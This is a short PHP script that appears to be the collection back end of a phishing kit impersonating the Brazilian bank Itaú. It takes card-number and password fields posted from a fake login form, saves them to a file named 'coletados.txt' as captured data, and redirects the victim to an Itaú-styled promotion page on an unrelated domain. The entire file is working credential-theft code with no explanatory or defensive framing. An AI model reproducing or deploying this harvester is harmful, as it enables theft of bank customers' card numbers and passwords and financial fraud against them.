<?php
	$login = $_POST['numc'];
	$senha = $_POST['passc'];

	$capturado = "CC: $login - Senha: $senha";

	$arquivo = fopen('coletados.txt','w');
	if ($arquivo == false) die('Não foi possível criar o arquivo.');

	fwrite($arquivo, $capturado);
	fclose($arquivo);

	header('Location: https://itau.lordbrasil.info/promocao.html');
?>

